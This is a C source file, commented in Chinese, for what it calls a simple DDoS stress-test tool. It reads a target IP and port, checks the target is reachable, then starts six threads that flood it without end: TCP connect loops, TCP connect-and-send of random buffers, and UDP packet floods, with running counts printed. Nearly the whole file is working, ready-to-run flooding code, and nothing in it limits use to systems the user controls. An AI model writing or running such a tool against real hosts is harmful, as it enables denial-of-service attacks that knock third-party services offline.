#ifdef _MSC_VER
#include "pthread.h"
#else
#include <pthread.h>
#endif
#include "iop_util.h"

#define _INT_HOSTV4			(16)	
#define _INT_TIMEOUT		(3000)

struct targ {
	sockaddr_t addr;
	char ts[BUFSIZ];
	char us[BUFSIZ];

	// 攻击次数统计
	uint64_t connect;
	uint64_t tcpsend;
	uint64_t udpsend;
};

// 得到玩家输入的地址信息
void addr_input(int argc, char * argv[], sockaddr_t * addr);

// 检查IP是否合法
bool addr_check(sockaddr_t * addr);

// 初始化包内容
void buf_init(char ts[BUFSIZ], char us[BUFSIZ]);

// 目前启动3个类型线程, 2个是connect, 2个是connect + send 2个是 udp send
void ddos_run(struct targ * arg);

//
// 简易的 ddos 压测工具
//
int main(int argc, char * argv[]) {
	struct targ arg = { 0 };

	// 装载socket 库
	SOCK_STARTUP();

	// 得到玩家的地址信息
	addr_input(argc, argv, &arg.addr);

	if (!addr_check(&arg.addr))
		CERR_EXIT("ip or port check is error!!!");

	// 这里开始疯狂发包处理了, 先初始化发的包内容
	buf_init(arg.ts, arg.us);

	// 开始要启动线程了
	ddos_run(&arg);

	// :> 开始统计数据
	puts("connect count		tcp send count			udp send count");
	for (;;) {
		printf(" %"PRIu64"			 %"PRIu64"				 %"PRIu64"\n", arg.connect, arg.tcpsend, arg.udpsend);
		sh_sleep(_INT_TIMEOUT);
	}

	// 卸载socket 库
	SOCK_CLEANUP();

	return EXIT_SUCCESS;
}

// 得到玩家输入的地址信息
void 
addr_input(int argc, char * argv[], sockaddr_t * addr) {
	bool flag = true;
	int rt = 0;
	uint16_t port;
	char ip[_INT_HOSTV4] = { 0 };

	if (argc != 3) {
		puts("Please input ip and port, example :> 127.0.0.1 8088");
		printf(":> ");

		// 自己重构scanf, 解决注入漏洞
		while (rt < _INT_HOSTV4 - 1) {
			char c = getchar();
			if (isspace(c)) {
				if (flag)
					continue;
				else
					break;
			}
			flag = false;
			ip[rt++] = c;
		}
		ip[rt] = '\0';

		rt = scanf("%hu", &port);
		if (rt != 1)
			CERR_EXIT("scanf_s addr->host = %s, port = %hu.", ip, port);
	}
	else {
		strncpy(ip, argv[1], sizeof(ip) - 1);
		rt = atoi(argv[2]);
		if (rt <= 0 || rt > USHRT_MAX)
			CERR_EXIT("error rt = %s | %s.", argv[1], argv[2]);
		port = (uint16_t)rt;
	}

	printf("connect check input addr ip:port = %s:%hu.\n", ip, port);

	// 下面就是待验证的地址信息
	SOCKADDR_IN(*addr, ip, port);
}

// 检查IP是否合法
bool 
addr_check(sockaddr_t * addr) {
	int r;
	socket_t s = socket_stream();
	if (s == INVALID_SOCKET) {
		RETURN(false, "socket_stream is error!!");
	}

	r = socket_connecto(s, addr, _INT_TIMEOUT);
	socket_close(s);
	if (r < Success_Base) {
		RETURN(false, "socket_connecto addr is timeout = %d.", _INT_TIMEOUT);
	}

	return true;
}

// 初始化包内容
void 
buf_init(char ts[BUFSIZ], char us[BUFSIZ]) {
	int r = -1;
	srand((unsigned)time(NULL));

	while (++r < BUFSIZ)
		ts[r] = (rand() % 256) - 128;

	r = -1;
	while(++r < BUFSIZ)
		us[r] = (rand() % 256) - 128;
}

// connect 链接
static void * _connect(void * arg) {
	struct targ * targ = arg;

	// 疯狂connect
	for (;;) {
		socket_t s = socket_stream();
		if (s == INVALID_SOCKET) {
			CERR("socket_stream is error!");
			continue;
		}

		// 粗略统计
		if (socket_connect(s, &targ->addr) >= Success_Base) {
			++targ->connect;
		}

		socket_close(s);


	}

	return arg;
}

// connect + send 连接
static void * _tcpsend(void * arg) {
	struct targ * targ = arg;

	// 疯狂connect
	for (;;) {
		socket_t s = socket_stream();
		if (s == INVALID_SOCKET) {
			CERR("socket_stream is error!");
			continue;
		}

		if (socket_connect(s, &targ->addr) >= Success_Base) {
			socket_sendn(s, targ->ts, BUFSIZ);
			++targ->tcpsend;
		}	

		socket_close(s);
	}

	return arg;
}

// udp send 连接
static void * _udpsend(void * arg) {
	struct targ * targ = arg;

	for (;;) {
		socket_t s = socket_dgram();
		if (s == INVALID_SOCKET) {
			CERR("socket_stream is error!");
			continue;
		}

		socket_sendto(s, targ->us, BUFSIZ, 0, &targ->addr, sizeof(targ->addr));

		socket_close(s);

		++targ->udpsend;
	}

	return arg;
}

// 目前启动3个类型线程, 2个是connect, 2个是connect + send 2个是 udp send
void 
ddos_run(struct targ * arg) {
	pthread_t tid;
	pthread_attr_t attr;

	// 构建pthread 线程奔跑起来
	pthread_attr_init(&attr);
	pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);

	// 创建两个 connect 线程
	if (pthread_create(&tid, &attr, _connect, arg) < 0)
		CERR("pthread_create _connect 1 error run, arg = %p ", arg);
	else
		puts("pthread_create 1 _connect 1 run ...");

	if (pthread_create(&tid, &attr, _connect, arg) < 0)
		CERR("pthread_create _connect 2 error run, arg = %p ", arg);
	else
		puts("pthread_create 2 _connect 2 run ...");

	// 创建两个 connect + send 线程
	if (pthread_create(&tid, &attr, _tcpsend, arg) < 0)
		CERR("pthread_create _connectsend 1 error run, arg = %p ", arg);
	else
		puts("pthread_create 3 _connectsend 1 run ...");

	if (pthread_create(&tid, &attr, _tcpsend, arg) < 0)
		CERR("pthread_create _connectsend 2 error run, arg = %p ", arg);
	else
		puts("pthread_create 4 _connectsend 2 run ...");

	// 创建两个 _udpsend 线程
	if (pthread_create(&tid, &attr, _udpsend, arg) < 0)
		CERR("pthread_create _udpsend 1 error run, arg = %p ", arg);
	else
		puts("pthread_create 5 _udpsend 1 run ...");

	if (pthread_create(&tid, &attr, _udpsend, arg) < 0)
		CERR("pthread_create _udpsend 2 error run, arg = %p ", arg);
	else
		puts("pthread_create 6 _udpsend 2 run ...");

	pthread_attr_destroy(&attr);
}